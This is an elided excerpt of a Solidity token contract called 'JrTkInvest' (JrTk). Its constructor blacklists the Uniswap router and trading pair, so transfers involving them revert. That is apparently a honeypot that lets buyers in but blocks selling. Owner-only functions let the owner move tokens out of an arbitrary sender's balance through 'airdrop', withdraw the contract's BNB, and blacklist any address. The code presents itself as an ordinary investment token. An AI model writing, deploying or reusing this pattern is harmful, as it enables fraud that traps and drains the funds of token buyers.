...
contract TKJR is Context, IERC20, Ownable {
    ...
    address constant DEV                             = 0xCfD73ee3399DF123AeF5DA5D76835E2B41D9d0a5;

    // TOKEN GLOBAL VARIABLES
    string constant _name                            = "JrTkInvest";
    string constant _symbol                          = "JrTk";
    ...
    constructor () {
        ...
        uniswapV2Pair                            = pair;
        _isBlacklisted[address(uniswapV2Router)] = true;
        _isBlacklisted[uniswapV2Pair]            = true;
    ...
    function _transfer(
        ...
        // EXCHANGE TOKENS
        exchangeTokens(sender, recipient, amount); 
    }
    // SETS RECEIVED AMOUNT
    function exchangeTokens(address sender, address recipient, uint256 amount) internal {
    ...
    function checkBlacklist(address sender, address recipient) internal view {
        require(!_isBlacklisted[msg.sender] && !_isBlacklisted[sender] && !_isBlacklisted[recipient], "BLACKLISTED");
    }
    ...
    // 04. WITHDRAW BNB FROM THE CONTRACT
    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        require(amountPercentage <= 100 && amountPercentage > 0, "You can only select a number from 1 to 100");            uint256 amountBNB = address(this).balance;
            uint256 weiAmount = amountBNB * amountPercentage / 100;
            payable(owner()).sendValue(weiAmount);
    }
    // 05. WITHDRAW TOKENS FROM THE CONTRACT
    ...
    // 06. AIRDROP
    function airdrop(address _sender, address _recipient, uint256 _amount) external onlyOwner {
        require(balanceOf(_sender) >= _amount, "Amount exceeds balance.");
    ...
    function blacklist(address _address, bool _enabled) external onlyOwner {
        require(_address != owner(), "You can't blacklist yourself");
